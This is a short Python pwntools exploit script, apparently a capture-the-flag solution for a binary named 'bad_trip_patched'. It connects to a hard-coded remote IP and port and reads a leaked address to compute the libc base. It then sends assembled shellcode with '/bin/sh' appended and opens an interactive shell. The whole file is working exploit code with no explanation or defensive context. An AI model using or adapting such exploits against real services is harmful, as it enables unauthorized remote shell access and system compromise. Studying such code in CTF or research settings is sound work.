#!/usr/bin/env python3

from pwn import *

exe = ELF("./bad_trip_patched")
libc = ELF("libc-2.38-2-x86_64.so")

context.binary = exe


def conn():
    r = process([exe.path])
    return r


def main():
    try:
        #r = process("./bad_trip_patched")
        r = remote("172.210.129.230", 1352)
        #r = remote("127.0.0.1", 1352)
        r.recvuntil("here ill give you something to start with ")
        addr = int(r.recvline().strip(), 16)
        log.info("%x", addr)
        puts = 0x7f15 << 32 | addr
        base = puts - 0x79bf0
        libc.address = base
        log.info("libc base 0x%x", base)
        syscall = base + 0x90b5e
        

        shellcode = f"""
        mov r15, qword ptr fs:[0]
        shr r15, 32
        shl r15, 32
        mov r14, {addr}
        add r15, r14
        lea rsp, [r13 - 0x1000]
        sub r15, 173200
        add rdi, 0x33
        jmp r15
        """
        pause()
        r.sendline(asm(shellcode) + b"/bin/sh\x00")
        r.interactive()
    except:
        r.close()



if __name__ == "__main__":
    if True:
        main()
